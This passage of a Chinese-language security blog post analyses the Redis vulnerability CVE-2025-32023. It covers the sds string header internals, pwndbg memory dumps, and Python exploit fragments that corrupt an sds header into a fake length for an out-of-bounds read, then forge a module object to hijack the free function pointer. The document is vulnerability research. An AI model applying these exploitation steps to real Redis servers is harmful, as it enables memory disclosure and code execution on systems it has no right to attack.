LLONG_MAX)</span></span><br><span class="line">    <span class="keyword">if</span> (string_size &lt; <span class="number">1ll</span>&lt;&lt;<span class="number">32</span>)</span><br><span class="line">        <span class="keyword">return</span> SDS_TYPE_32;</span><br><span class="line">    <span class="keyword">return</span> SDS_TYPE_64;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="keyword">return</span> SDS_TYPE_32;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在 <code>_sdsnewlen</code> 函数中完成对 sds 结构的初始化</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">sds _sdsnewlen(<span class="keyword">const</span> <span class="keyword">void</span> *init, <span class="keyword">size_t</span> initlen, <span class="keyword">int</span> trymalloc) &#123;</span><br><span class="line">    <span class="keyword">char</span> type = sdsReqType(initlen);</span><br><span class="line">    <span class="comment">/* Empty strings are usually created in order to append. Use type 8</span></span><br><span class="line"><span class="comment">     * since type 5 is not good at this. */</span></span><br><span class="line">    <span class="keyword">if</span> (type == SDS_TYPE_5 &amp;&amp; initlen == <span class="number">0</span>) type = SDS_TYPE_8;</span><br><span class="line">    <span class="keyword">int</span> hdrlen = sdsHdrSize(type);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *fp; <span class="comment">/* flags pointer. */</span></span><br><span class="line">    <span class="keyword">size_t</span> usable;</span><br><span class="line">	    ...</span><br><span class="line">    s = (<span class="keyword">char</span>*)sh+hdrlen;</span><br><span class="line">    fp = ((<span class="keyword">unsigned</span> <span class="keyword">char</span>*)s)<span class="number">-1</span>;</span><br><span class="line">	    ...</span><br><span class="line"><span class="keyword">switch</span>(type) &#123;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_5: &#123;</span><br><span class="line">            *fp = type | (initlen &lt;&lt; SDS_TYPE_BITS);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_8: &#123;</span><br><span class="line">            SDS_HDR_VAR(<span class="number">8</span>,s);</span><br><span class="line">            sh-&gt;len = initlen;</span><br><span class="line">            sh-&gt;alloc = usable;</span><br><span class="line">            *fp = type;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_16: &#123;</span><br><span class="line">            SDS_HDR_VAR(<span class="number">16</span>,s);</span><br><span class="line">            sh-&gt;len = initlen;</span><br><span class="line">            sh-&gt;alloc = usable;</span><br><span class="line">            *fp = type;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_32: &#123;</span><br><span class="line">            SDS_HDR_VAR(<span class="number">32</span>,s);</span><br><span class="line">            sh-&gt;len = initlen;</span><br><span class="line">            sh-&gt;alloc = usable;</span><br><span class="line">            *fp = type;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_64: &#123;</span><br><span class="line">            SDS_HDR_VAR(<span class="number">64</span>,s);</span><br><span class="line">            sh-&gt;len = initlen;</span><br><span class="line">            sh-&gt;alloc = usable;</span><br><span class="line">            *fp = type;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (initlen &amp;&amp; init)</span><br><span class="line">        <span class="built_in">memcpy</span>(s, init, initlen);</span><br><span class="line">    s[initlen] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在内存中可以看到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x <span class="number">0x8c</span> &amp; <span class="number">0x3</span></span><br><span class="line">$<span class="number">106</span> = <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; p idx</span><br><span class="line">$<span class="number">107</span> = <span class="number">-38252</span></span><br><span class="line">pwndbg&gt; p idx*<span class="number">6</span>/<span class="number">8</span></span><br><span class="line">$<span class="number">108</span> = <span class="number">-28689</span></span><br><span class="line">pwndbg&gt; p hdr-&gt;registers</span><br><span class="line">$<span class="number">109</span> = <span class="number">0x7ffff797d015</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt;</span><br><span class="line">pwndbg&gt; x/<span class="number">20b</span>x <span class="number">0x7ffff7976000</span></span><br><span class="line"><span class="number">0x7ffff7976000</span>: <span class="number">0xfa</span>    <span class="number">0x37</span>    <span class="number">0xfa</span>    <span class="number">0x37</span>    <span class="number">0x02</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span></span><br><span class="line"><span class="number">0x7ffff7976008</span>: <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span></span><br><span class="line"><span class="number">0x7ffff7976010</span>: <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">20b</span>x  <span class="number">0x7ffff7976000</span>+<span class="number">0x37fa</span><span class="number">-8</span></span><br><span class="line"><span class="number">0x7ffff79797f2</span>: <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x42</span>    <span class="number">0x42</span>    <span class="number">0x42</span></span><br><span class="line"><span class="number">0x7ffff79797fa</span>: <span class="number">0x42</span>    <span class="number">0x42</span>    <span class="number">0x42</span>    <span class="number">0x42</span>    <span class="number">0x42</span>    <span class="number">0x00</span>    <span class="number">0xfa</span>    <span class="number">0x37</span></span><br><span class="line"><span class="number">0x7ffff7979802</span>: <span class="number">0xfa</span>    <span class="number">0x37</span>    <span class="number">0x02</span>    <span class="number">0x00</span></span><br><span class="line">pwndbg&gt;</span><br><span class="line">pwndbg&gt; p/x *(struct sdshdr16 *)<span class="number">0x7ffff7976000</span></span><br><span class="line">$<span class="number">104</span> = &#123;</span><br><span class="line">  len = <span class="number">0x37fa</span>,</span><br><span class="line">  alloc = <span class="number">0x37fa</span>,</span><br><span class="line">  flags = <span class="number">0x2</span>,</span><br><span class="line">  buf = <span class="number">0x7ffff7976005</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由于 <code>sdslen</code> 函数取 sds 长度，是先根据不同的 flags， 然后再根据这个 flags 取计算这个 sds 的header 长度， 然后以当前地址减去 header长度取 len 这个变量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">size_t</span> <span class="title">sdslen</span><span class="params">(<span class="keyword">const</span> sds s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> flags = s[<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">switch</span>(flags&amp;SDS_TYPE_MASK) &#123;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_5:</span><br><span class="line">            <span class="keyword">return</span> SDS_TYPE_5_LEN(flags);</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_8:</span><br><span class="line">            <span class="keyword">return</span> SDS_HDR(<span class="number">8</span>,s)-&gt;len;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_16:</span><br><span class="line">            <span class="keyword">return</span> SDS_HDR(<span class="number">16</span>,s)-&gt;len;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_32:</span><br><span class="line">            <span class="keyword">return</span> SDS_HDR(<span class="number">32</span>,s)-&gt;len;</span><br><span class="line">        <span class="keyword">case</span> SDS_TYPE_64:</span><br><span class="line">            <span class="keyword">return</span> SDS_HDR(<span class="number">64</span>,s)-&gt;len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span> ((__<span class="title">packed__</span>)) <span class="title">sdshdr16</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span> len; <span class="comment">/* used */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> alloc; <span class="comment">/* excluding the header and null terminator */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> flags; <span class="comment">/* 3 lsb of type, 5 unused bits */</span></span><br><span class="line">    <span class="keyword">char</span> buf[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span> ((__<span class="title">packed__</span>)) <span class="title">sdshdr64</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> len; <span class="comment">/* used */</span></span><br><span class="line">    <span class="keyword">uint64_t</span> alloc; <span class="comment">/* excluding the header and null terminator */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> flags; <span class="comment">/* 3 lsb of type, 5 unused bits */</span></span><br><span class="line">    <span class="keyword">char</span> buf[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>而 <code>sdshdr64</code> 和<code>sdshdr16</code> 的结构体 大小不一样，因此如果将 <code>sds16</code>的 flags 改成 <code>SDS_TYPE_64</code> , 将为从上一个内存中取一个值作为 sds的长度 （造成一个类似类型混淆的效果） </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fakelen &#x3D; 0x4142434445464748</span><br><span class="line"> </span><br><span class="line">r.setrange(&#39;sds:aa&#39;, 0x37fa - 11, p64(fakelen))  # sds @ 0x0005, p64() 00 00 00 00 </span><br><span class="line">r.setrange(&#39;sds:bb&#39;, 0x37fa - 8, b&#39;B&#39;*8)         # sds @ 0x3805, ................. fa 37 fa 37 02 ~</span><br></pre></td></tr></table></figure>



<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-12-95209fbc6852fb89f57affe6eb949558-01f569.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-12-95209fbc6852fb89f57affe6eb949558-01f569.png" alt="image.png"></a></p>
<p>例如下面的这样的一个效果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p&#x2F;x *(struct sdshdr16 *)0x7ffff7976000</span><br><span class="line">$115 &#x3D; &#123;</span><br><span class="line">  len &#x3D; 0x37fa,</span><br><span class="line">  alloc &#x3D; 0x37fa,</span><br><span class="line">  flags &#x3D; 0x2,</span><br><span class="line">  buf &#x3D; 0x7ffff7976005</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p&#x2F;x *(struct sdshdr64 *)(0x7ffff7976000-11)</span><br><span class="line">$116 &#x3D; &#123;</span><br><span class="line">  len &#x3D; 0x41424344454647,</span><br><span class="line">  alloc &#x3D; 0x237fa37fa000000,</span><br><span class="line">  flags &#x3D; 0x0,</span><br><span class="line">  buf &#x3D; 0x7ffff7976006</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>当从 <code>sdshder16</code> 被当成 <code>sdshdr64</code> 后， <code>sds:b</code> 的长度就变成了上一个内存的一个可控制， 作者是将这个值设置成<code>0x41424344454647</code>。 这样当我们就可以将这个<code>sds:b</code> 当作一个很长的字符串进行操作。作者后面的思路是在内存后喷一堆 embstr， 然后取读取 <code>sds:b</code> 的内容 。 由于此时 sds:b 长度很长，因此读取这个字符串的时候能读书很多的数据，可以读到内存后面很多的东西，这样就可以做 info leak。</p>
<p>然后通过写 <code>sds:b</code> 字符串到操作，在内存中伪造了一个 type 为 Modules 的 Object</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># fake module object</span><br><span class="line">pl &#x3D; p8(0x05) + dump[tofs+1:tofs+4]   # type, encoding, lru</span><br><span class="line">pl +&#x3D; p32(1)                          # refcount</span><br><span class="line">pl +&#x3D; p64(badr + 0x10)                # ptr</span><br><span class="line">r.setrange(&#39;sds:bb&#39;, tofs+3, pl)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">RedisModuleType</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> id; <span class="comment">/* Higher 54 bits of type ID + 10 lower bits of encoding ver. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">RedisModule</span> *<span class="title">module</span>;</span></span><br><span class="line">    moduleTypeLoadFunc rdb_load;</span><br><span class="line">    moduleTypeSaveFunc rdb_save;</span><br><span class="line">    moduleTypeRewriteFunc aof_rewrite;</span><br><span class="line">    moduleTypeMemUsageFunc mem_usage;</span><br><span class="line">    moduleTypeDigestFunc digest;</span><br><span class="line">    moduleTypeFreeFunc <span class="built_in">free</span>;</span><br><span class="line">    moduleTypeFreeEffortFunc free_effort;</span><br><span class="line">    moduleTypeUnlinkFunc unlink;</span><br><span class="line">    moduleTypeCopyFunc copy;</span><br><span class="line">    moduleTypeDefragFunc defrag;</span><br><span class="line">    moduleTypeAuxLoadFunc aux_load;</span><br><span class="line">    moduleTypeAuxSaveFunc aux_save;</span><br><span class="line">    moduleTypeMemUsageFunc2 mem_usage2;</span><br><span class="line">    moduleTypeFreeEffortFunc2 free_effort2;</span><br><span class="line">    moduleTypeUnlinkFunc2 unlink2;</span><br><span class="line">    moduleTypeCopyFunc2 copy2;</span><br><span class="line">    moduleTypeAuxSaveFunc aux_save2;</span><br><span class="line">    <span class="keyword">int</span> aux_save_triggers;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">10</span>]; <span class="comment">/* 9 bytes name + null term. Charset: A-Z a-z 0-9 _- */</span></span><br><span class="line">&#125; moduleType;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeModuleObject</span><span class="params">(robj *o)</span> </span>&#123;</span><br><span class="line">    moduleValue *mv = o-&gt;ptr;</span><br><span class="line">    mv-&gt;type-&gt;<span class="built_in">free</span>(mv-&gt;value);</span><br><span class="line">    zfree(mv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过需改 <code>type-&gt;free</code> 来控制 PC</p>
<h2 id="完整的利用流程"><a href="#完整的利用流程" class="headerlink" title="完整的利用流程"></a>完整的利用流程</h2><p>可以看 deepwiki 生成的这个流程图<sup id="fnref:4"><a href="#fn:4" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://deepwiki.com/leesh3288/CVE-2025-32023/2.2-six-stage-exploitation-methodology
">[4]</span></a></sup></p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-11-9df67aa6e235c5363cfae11b4eb03208-4a48ae.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2025-07-11-9df67aa6e235c5363cfae11b4eb03208-4a48ae.png" alt="image.png"></a></p>
<h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://redis.io/docs/latest/commands/pfmerge/<a href="#fnref:1" rev="footnote"> ↩</a></span></li><li id="fn:2"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">2.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://redis.io/docs/latest/operate/oss_and_stack/reference/internals/internals-sds/<a href="#fnref:2" rev="footnote"> ↩</a></span></li><li id="fn:3"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">3.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://github.com/leesh3288/CVE-2025-32023<a href="#fnref:3" rev="footnote"> ↩</a></span></li><li id="fn:4"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">4.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">https://deepwiki.com/leesh3288/CVE-2025-32023/2.2-six-stage-exploitation-methodology<a href="#fnref:4" rev="footnote"> ↩</a></span></li></ol></div></div></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
</div>


  <footer class="post-footer">
  
    <div class="post-tags">
      
        <a href="/tags/redis/" class="tag">redis</a>
      
    </div>
  
</footer>


  
<nav class="post-nav">
  

  
    <div class="post-nav-item next">
      <span class="post-nav-label">Next &rarr;</span>
      <a href="/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html" class="post-nav-title">
        CVE-2025-36463 Sudo_chroot Elevation of Privilege 漏洞分析
      </a>
    </div>
  
</nav>



  
</article>

        </div>
      
    </main>

    <footer class="footer">
  <div class="footer-content">
    <div class="footer-left">
      
      <span class="copyright">
        &copy; 2024 - 2026 Swing
      </span>
    </div>

    <div class="footer-right">
      
        <span class="powered">
          Powered by Hexo <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>
        </span>
      
      
        <span class="theme-info">
          Theme <a href="https://github.com/yourname/hexo-theme-Bloom" target="_blank" rel="noopener">Bloom</a>
        </span>
      
    </div>
  </div>

  
    <div class="footer-social">
      
        <a href="https://github.com/WinMin" class="social-link" target="_blank" rel="noopener" aria-label="GitHub">
          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
        </a>
      
      
        <a href="https://twitter.com/bestswngs" class="social-link" target="_blank" rel="noopener" aria-label="Twitter">
          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
        </a>
      
      
      
        <a href="mailto:ask@mail.exp.sh" class="social-link" aria-label="Email">
          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
        </a>
      
      
        <a href="/atom.xml" class="social-link" aria-label="RSS">
          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1z"/></svg>
        </a>
      
    </div>
  
</footer>

  </div>

  <!-- Main Script -->

<script src="/js/main.js"></script>


<!-- Search -->


<script src="/js/search.js"></script>



<!-- Baidu Analytics -->


</body>
</html>
